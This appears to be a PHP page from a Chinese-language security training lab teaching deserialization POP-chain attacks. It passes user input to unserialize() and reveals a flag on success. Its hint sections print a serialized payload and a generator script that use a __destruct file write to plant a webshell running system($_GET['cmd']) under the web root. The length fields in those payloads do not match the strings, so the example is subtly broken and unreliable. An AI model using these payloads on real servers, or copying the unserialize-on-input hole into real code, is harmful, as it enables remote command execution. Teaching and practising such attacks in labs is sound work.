<?php
$module_name = 'POP链构造 - 简单';
$module_icon = '🔗';
$module_desc = '通过多个类的魔术方法串联形成攻击链，入门级POP链构造。';

$flag = getenv('FLAG') ?: 'flag{deserialization_success}';

class FileHandler {
    public $filename = "/tmp/test.txt";
    public $content = "default";

    public function __wakeup() {}

    public function __destruct() {
        // 模拟文件写入
    }

    public function __toString() {
        return "FileHandler: {$this->filename}";
    }
}

class Logger {
    public $logFile = "/tmp/app.log";
    public $logData = "default log";

    public function __destruct() {}
    public function __toString() { return $this->logData; }
}

class VulnerableClass {
    public $cmd = "id";
    public function __invoke() {}
}

$challenge_result = '';
if (isset($_GET['data'])) {
    $data = $_GET['data'];
    $challenge_result .= '<div class="card mb-3"><div class="card-header"><h6>📥 输入数据</h6></div><div class="card-body"><pre class="bg-dark text-light p-3 rounded">' . htmlspecialchars($data) . '</pre></div></div>';

    try {
        $obj = @unserialize($data);
        if ($obj) {
            $challenge_result .= '<div class="alert alert-success"><strong>🎉 反序列化成功！</strong><pre class="bg-dark text-light p-3 rounded">' . htmlspecialchars(print_r($obj, true)) . '</pre></div>';
            $challenge_result .= '<div class="alert alert-info"><strong>🚩 Flag：</strong>' . htmlspecialchars($flag) . '</div>';
        } else {
            $challenge_result .= '<div class="alert alert-danger">反序列化失败！请检查数据格式。</div>';
        }
    } catch (Exception $e) {
        $challenge_result .= '<div class="alert alert-danger">错误: ' . htmlspecialchars($e->getMessage()) . '</div>';
    }
}

$data_attr = isset($_GET['data']) ? htmlspecialchars($_GET['data']) : '';

$content = <<<'EOT'
<div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">💡 漏洞原理</h5></div>
            <div class="card-body">
                <div class="alert alert-info">
                    <strong>什么是POP链？</strong><br>
                    POP（Property Oriented Programming）链是通过<strong>多个类的魔术方法串联</strong>形成的攻击链。
                </div>
                <h6>🎯 攻击思路</h6>
                <ol>
                    <li>找到反序列化入口点</li>
                    <li>分析可用的类和魔术方法</li>
                    <li>找到危险操作（文件写入、命令执行等）</li>
                    <li>串联多个类的魔术方法，形成攻击链</li>
                </ol>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">💻 漏洞代码</h5></div>
            <div class="card-body">
                <pre class="bg-dark text-light p-3 rounded"><code>class FileHandler {
    public $filename = "/tmp/test.txt";
    public $content = "default";

    public function __destruct() {
        // 对象销毁时写入文件
        file_put_contents($this->filename, $this->content);
    }
}

// 漏洞入口
$data = $_GET['data'];
$obj = unserialize($data);</code></pre>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">🎯 尝试挑战</h5></div>
            <div class="card-body">
                <form method="GET">
                    <div class="mb-3">
                        <label class="form-label">序列化数据：</label>
EOT;
$content .= '                        <input type="text" name="data" class="form-control" value="' . $data_attr . '" placeholder="输入序列化数据">';
$content .= <<<'EOT'
                    </div>
                    <button type="submit" class="btn btn-primary">反序列化</button>
                </form>
EOT;
$content .= $challenge_result;
$content .= <<<'EOT'
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">💡 解题提示</h5></div>
            <div class="card-body">
                <h6>思路一：利用FileHandler写入文件</h6>
                <pre class="bg-dark text-light p-2 rounded">O:11:"FileHandler":2:{s:8:"filename";s:18:"/var/www/html/s.php";s:7:"content";s:31:"<?php system($_GET['cmd']);?>";}</pre>
                <h6>思路二：构造POP链</h6>
                <ol>
                    <li>创建FileHandler对象</li>
                    <li>设置filename为WebShell路径</li>
                    <li>设置content为PHP代码</li>
                    <li>反序列化后__destruct()会写入文件</li>
                </ol>
            </div>
        </div>

        <div class="card">
            <div class="card-header"><h5 class="mb-0">🔍 POP链构造示例</h5></div>
            <div class="card-body">
                <pre class="bg-dark text-light p-3 rounded"><code><?php
// 构造POP链
$evil = new FileHandler();
$evil->filename = "/var/www/html/shell.php";
$evil->content = "<?php system(\$_GET['cmd']);?>";

// 生成Payload
echo urlencode(serialize($evil));
// 输出示例: O%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A18%3A%22%2Fvar%2Fwww%2Fhtml%2Fshell.php%22%3Bs%3A7%3A%22content%22%3Bs%3A31%3A%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%3B%7D</code></pre>

                <h6>常见魔术方法利用链</h6>
                <pre class="bg-dark text-light p-3 rounded">入口点（触发反序列化）:
  unserialize($input)

触发链:
  __destruct() → 文件写入/命令执行
  __toString() → 文件读取
  __invoke() → 命令执行
  __call() → 方法调用
  __get() → 属性访问</pre>
            </div>
        </div>
EOT;

include '../template/module_template.php';
